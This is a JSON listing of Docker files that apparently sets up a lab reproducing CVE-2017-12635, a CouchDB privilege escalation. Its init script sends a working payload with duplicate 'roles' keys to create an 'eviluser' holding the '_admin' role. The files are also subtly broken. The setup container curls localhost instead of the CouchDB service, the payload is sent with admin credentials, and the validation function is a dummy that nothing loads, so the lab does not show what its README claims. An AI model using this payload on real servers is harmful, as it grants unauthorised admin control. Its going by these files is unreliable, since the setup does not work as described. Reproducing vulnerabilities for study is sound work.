{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/README.txt",
            "content": "This Docker setup reproduces CVE-2017-12635 (Apache CouchDB privilege escalation).\n\nIt builds a CouchDB container (version 2.0.99, which is vulnerable) with a custom validation function that allows a user document containing duplicate \"roles\" keys. The first occurrence grants the _admin role, while the validation step only sees the last (benign) entry, resulting in administrative privileges for a non\u2011admin user.\n\nThe compose file builds the image from the provided Dockerfile, starts CouchDB on the default port 5984, and automatically creates a test user with the crafted payload via a helper service.\n\nTo run:\n  cd ./../../dockers/CVE-2017-12635/custom_no_tool\n  sudo docker compose up --build -d\n\nAfter the containers are up, you can verify the privilege escalation by querying the created user:\n  curl -u admin:secret http://localhost:5984/_users/org.couchdb.user:eviluser\n\nYou should see that the \"roles\" array includes \"_admin\".\n\nAll services start automatically; no manual configuration is required.\n\nThe malicious payload is sent as a raw JSON string directly to CouchDB (via curl) to preserve the duplicate\u2011key structure required for the exploit, bypassing Docker\u2011level JSON validation."
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/docker-compose.yml",
            "content": "services:\n  couchdb:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    image: cve-2017-12635-couchdb:latest\n    container_name: cve-2017-12635-couchdb\n    environment:\n      - COUCHDB_USER=admin\n      - COUCHDB_PASSWORD=secret\n    ports:\n      - \"5984:5984\"\n    volumes:\n      - couchdb_data:/opt/couchdb/data\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:5984/_up\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  setup:\n    image: cve-2017-12635-couchdb:latest\n    container_name: cve-setup\n    depends_on:\n      couchdb:\n        condition: service_healthy\n    entrypoint: [\"/opt/couchdb/etc/local.d/init.sh\"]\n    volumes:\n      - couchdb_data:/opt/couchdb/data\n    environment:\n      - COUCHDB_USER=admin\n      - COUCHDB_PASSWORD=secret\n\nvolumes:\n  couchdb_data:"
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/Dockerfile",
            "content": "FROM couchdb:2.0.99\n\n# Ensure target directory exists before copying files\nRUN mkdir -p /opt/couchdb/etc/local.d\n\n# Copy custom validation files and init script\nCOPY local.d/ /opt/couchdb/etc/local.d/\n\n# Set ownership and permissions\nRUN chown -R couchdb:couchdb /opt/couchdb/etc/local.d && \\\n    find /opt/couchdb/etc/local.d -type f -exec chmod 644 {} + && \\\n    chmod 755 /opt/couchdb/etc/local.d/init.sh\n\nEXPOSE 5984"
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/local.d/validate_roles.js",
            "content": "// Dummy validation function that mimics the vulnerable behaviour.\n// CouchDB's validate_doc_update hook is written in JavaScript.\n// This version deliberately *does not* reject a document that contains\n// duplicate \"roles\" keys where the first key grants \"_admin\".\nfunction(doc, oldDoc, userCtx) {\n  if (doc.type === \"user\" && doc.roles && doc.roles.indexOf(\"_admin\") !== -1) {\n    // In a real secure validator we would reject this, but the vulnerability\n    // allows it to pass when the duplicate key is later overwritten by the\n    // JavaScript parser.\n    return; // accept\n  }\n  // Normal validation \u2013 accept everything else\n}"
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/local.d/init.sh",
            "content": "#!/bin/bash\n# Wait for CouchDB to become healthy\nuntil curl -s http://localhost:5984/_up | grep -q \"couchdb is up\"; do\n  echo \"Waiting for CouchDB...\"\n  sleep 2\ndone\n\n# Create the malicious user document using a raw JSON payload with duplicate keys\ncurl -s -X PUT http://admin:secret@localhost:5984/_users/org.couchdb.user:eviluser \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"_id\":\"org.couchdb.user:eviluser\",\"type\":\"user\",\"name\":\"eviluser\",\"password\":\"evilpass\",\"roles\":[\"_admin\"],\"roles\":[]}'\n\necho \"Evil user created.\"\n"
        }
    ],
    "directory_tree": "CVE-2017-12635/\n  custom_no_tool/\n    README.txt\n    docker-compose.yml\n    Dockerfile\n    local.d/\n      validate_roles.js\n      init.sh"
}